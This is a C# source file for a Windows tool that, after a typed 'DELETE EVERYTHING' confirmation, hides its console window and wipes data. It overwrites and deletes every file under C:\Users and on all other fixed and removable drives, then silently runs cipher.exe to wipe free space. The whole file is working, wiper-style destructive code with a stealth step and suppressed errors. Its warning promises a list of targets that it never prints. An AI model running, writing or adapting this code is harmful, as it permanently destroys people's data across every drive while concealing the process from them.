using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Runtime.InteropServices;
using System.Security.Cryptography; // For RandomNumberGenerator

class DeleteAll
{
    // --- Windows API imports to hide the console window ---
    [DllImport("kernel32.dll")]
    static extern IntPtr GetConsoleWindow();

    [DllImport("user32.dll")]
    static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);

    const int SW_HIDE = 0;

    // Overwrite configuration
    private const int OverwritePasses = 3; // DoD 5220.22-M style
    private const int BufferSize = 4096;

    static void Run()
    {
        Console.ForegroundColor = ConsoleColor.Red;
        Console.WriteLine("!!! WARNING !!!");
        Console.WriteLine("This will PERMANENTLY destroy:");

        // ==========================================
        // CONFIRMATION GATE
        // ==========================================
        Console.ForegroundColor = ConsoleColor.Yellow;
        Console.WriteLine("Type 'DELETE EVERYTHING' (exact case) and press Enter to proceed:");
        string? confirmation = Console.ReadLine();

        if (!string.Equals(confirmation, "DELETE EVERYTHING", StringComparison.Ordinal))
        {
            Console.ForegroundColor = ConsoleColor.Green;
            Console.WriteLine("Aborted. No files were touched.");
            return;
        }

        // ==========================================
        // STEALTH MODE ACTIVATED
        // ==========================================
        var handle = GetConsoleWindow();
        ShowWindow(handle, SW_HIDE);
        Console.SetOut(TextWriter.Null);

        // ---- Detect volumes ----
        var volumes = new List<(string VolumeRoot, string TargetPath)>();
        var seen = new HashSet<string>(StringComparer.OrdinalIgnoreCase);

        foreach (var drive in DriveInfo.GetDrives())
        {
            try
            {
                if (!drive.IsReady) continue;
                if (drive.DriveType != DriveType.Fixed && drive.DriveType != DriveType.Removable) continue;

                string root = drive.RootDirectory.FullName;
                if (string.IsNullOrEmpty(root)) continue;
                if (!seen.Add(root)) continue;

                string target = root.Equals(@"C:\", StringComparison.OrdinalIgnoreCase)
                    ? @"C:\Users"
                    : root;

                volumes.Add((root, target));
            }
            catch { }
        }

        if (volumes.Count == 0) return;

        // ---- Process each volume sequentially ----
        foreach (var v in volumes)
        {
            if (Directory.Exists(v.TargetPath))
            {
                DeleteContentsFast(v.TargetPath);
            }

            // Run cipher silently on the volume root (free-space wipe)
            RunCipher(v.VolumeRoot);
        }
    }

    static void DeleteContentsFast(string rootPath)
    {
        try
        {
            var di = new DirectoryInfo(rootPath);
            if ((di.Attributes & FileAttributes.ReadOnly) != 0)
                di.Attributes &= ~FileAttributes.ReadOnly;
        }
        catch { }

        var stack = new Stack<string>();
        var dirsToDelete = new List<string>();
        stack.Push(rootPath);

        while (stack.Count > 0)
        {
            string current = stack.Pop();
            dirsToDelete.Add(current);

            string[] files;
            try { files = Directory.GetFiles(current); }
            catch { files = Array.Empty<string>(); }

            foreach (var f in files) SecureDeleteFile(f);

            string[] subs;
            try { subs = Directory.GetDirectories(current); }
            catch { subs = Array.Empty<string>(); }

            foreach (var d in subs) stack.Push(d);
        }

        for (int i = dirsToDelete.Count - 1; i >= 0; i--)
        {
            string d = dirsToDelete[i];
            if (string.Equals(d, rootPath, StringComparison.OrdinalIgnoreCase)) continue;

            try
            {
                var di = new DirectoryInfo(d);
                var attrs = di.Attributes;
                if ((attrs & FileAttributes.ReadOnly) != 0) attrs &= ~FileAttributes.ReadOnly;
                if ((attrs & FileAttributes.Hidden) != 0) attrs &= ~FileAttributes.Hidden;
                if ((attrs & FileAttributes.System) != 0) attrs &= ~FileAttributes.System;
                if (attrs != di.Attributes) di.Attributes = attrs;

                string longPath = d.StartsWith(@"\\?\") ? d : @"\\?\" + d;
                Directory.Delete(longPath, false);
            }
            catch { }
        }
    }

    static void SecureDeleteFile(string path)
    {
        try
        {
            var fi = new FileInfo(path);
            if (!fi.Exists) return;

            // Clear restrictive attributes so we can write
            var attrs = fi.Attributes;
            if ((attrs & FileAttributes.ReadOnly) != 0) attrs &= ~FileAttributes.ReadOnly;
            if ((attrs & FileAttributes.Hidden) != 0) attrs &= ~FileAttributes.Hidden;
            if ((attrs & FileAttributes.System) != 0) attrs &= ~FileAttributes.System;
            if (attrs != fi.Attributes) fi.Attributes = attrs;

            string longPath = path.StartsWith(@"\\?\") ? path : @"\\?\" + path;

            // ==========================================
            // MULTI-PASS OVERWRITE (HDD + SSD hygiene)
            // ==========================================
            long fileLength = fi.Length;
            if (fileLength > 0)
            {
                using (var fs = new FileStream(longPath, FileMode.Open, FileAccess.Write,
                                               FileShare.None, BufferSize, FileOptions.WriteThrough))
                {
                    var buffer = new byte[BufferSize];
                    using var rng = RandomNumberGenerator.Create();

                    for (int pass = 0; pass < OverwritePasses; pass++)
                    {
                        fs.Seek(0, SeekOrigin.Begin);

                        long remaining = fileLength;
                        while (remaining > 0)
                        {
                            int chunk = (int)Math.Min(BufferSize, remaining);
                            rng.GetBytes(buffer, 0, chunk);
                            fs.Write(buffer, 0, chunk);
                            remaining -= chunk;
                        }

                        // Force the OS to flush this pass to the physical medium
                        fs.Flush(true);
                    }

                    // Truncate after the final pass
                    fs.SetLength(0);
                    fs.Flush(true);
                }
            }

            // Final logical deletion
            File.Delete(longPath);
        }
        catch
        {
            // Fallback: at least attempt a normal delete
            try
            {
                string longPath = path.StartsWith(@"\\?\") ? path : @"\\?\" + path;
                File.Delete(longPath);
            }
            catch { }
        }
    }

    static void RunCipher(string volumeRoot)
    {
        try
        {
            var psi = new ProcessStartInfo
            {
                FileName = "cipher.exe",
                Arguments = $"/w:{volumeRoot}",
                UseShellExecute = false,
                CreateNoWindow = true,
                RedirectStandardOutput = true,
                RedirectStandardError = true
            };

            using var p = Process.Start(psi);
            if (p != null)
            {
                p.OutputDataReceived += (s, e) => { };
                p.ErrorDataReceived += (s, e) => { };
                p.BeginOutputReadLine();
                p.BeginErrorReadLine();

                p.WaitForExit();
            }
        }
        catch { }
    }
}
